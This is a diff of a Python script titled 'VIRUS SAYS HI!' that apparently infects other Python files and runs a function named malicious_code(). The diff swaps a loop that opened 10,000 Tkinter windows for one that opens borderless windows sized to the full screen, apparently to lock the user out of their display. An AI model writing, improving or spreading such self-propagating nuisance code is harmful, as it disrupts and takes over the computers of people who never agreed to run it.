@@ -1,5 +1,4 @@
 # VIRUS SAYS HI!
-
 import tkinter as tk
 import sys
 import glob
@@ -62,21 +61,16 @@ for file in python_files:
 
 
 def malicious_code():
-    HEIGHT = 400
-    WIDTH = 300
-    
-    root = tk.Tk()
-    root.title("new window making machine: ")
-    canvas = tk.Canvas(root, height=HEIGHT, width=WIDTH)
-    canvas.pack()
-    button = tk.Button(root, text="new window", bg='black', fg='#469A00')
-
-    for i in range(0, 10000):
-        window = tk.Toplevel(root)
-        canvas = tk.Canvas(window, height=HEIGHT, width=WIDTH)
+    HEIGHT = user32.GetSystemMetrics(1);
+    WIDTH = user32.GetSystemMetrics(0);
+    for i in range(0, 2):
+        root = tk.Tk()
+        root.overrideredirect(1)
+        canvas = tk.Canvas(root, height=HEIGHT, width=WIDTH)
         canvas.pack()
-    button.pack()
+
     root.mainloop()
+
 
 malicious_code()
 
